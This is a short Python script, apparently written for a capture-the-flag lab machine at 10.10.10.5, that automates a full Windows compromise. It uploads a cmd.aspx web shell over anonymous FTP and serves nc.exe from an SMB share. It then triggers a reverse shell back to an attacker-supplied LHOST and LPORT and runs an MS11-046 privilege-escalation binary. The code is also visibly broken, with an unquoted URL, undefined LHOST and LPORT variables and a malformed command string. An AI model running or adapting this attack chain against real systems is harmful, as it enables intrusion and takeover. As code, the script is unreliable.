#!/usr/bin/python3

import requests
import os
from pwn import * # pip install pwn

# ctrl + c
def ctrl_c(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

lhost=str(input("LHOST: ").strip("\n"))
lport=str(input("LPORT: ").strip("\n"))

def foothold():
	# sudo apt install lftp
	os.system('lftp -u anonymous,password -e "put cmd.aspx;quit" 10.10.10.5')
	os.system('cp /usr/share/windows-resources/binaries/nc.exe .')
	os.system('impacket-smbserver share $(pwd) &')
	os.system("curl -s -X POST http://10.10.10.5/cmd.aspx -d '__VIEWSTATE=%2FwEPDwULLTE2MjA0MDg4ODhkZH3%2Fl9d5ehe0wQ16Xwqm2%2BIK3Gzh&__EVENTVALIDATION=%2FwEWAwKYkb%2BhBgKa%2B%2BKPCgKBwth5MlBB88ADPiFdS9tgcFdOdMR2%2FDw%3D&txtArg=\\'+LHOST+'\share\nc.exe -e cmd.exe'+LHOST+LPORT'&testing=excute'")
	requests.get(http://IP/cmd.aspx)
try:
    threading.Thread(target=foothold, args=()).start()
except Exception as e:
    log.error(str(e))
shell = listen(lport, timeout=150).wait_for_connection()
if shell.sock is None:
    sys.exit(1)
else:
    shell.sendline(b"\\"+LHOST+"\share\MS11-046.exe")
    shell.interactive()
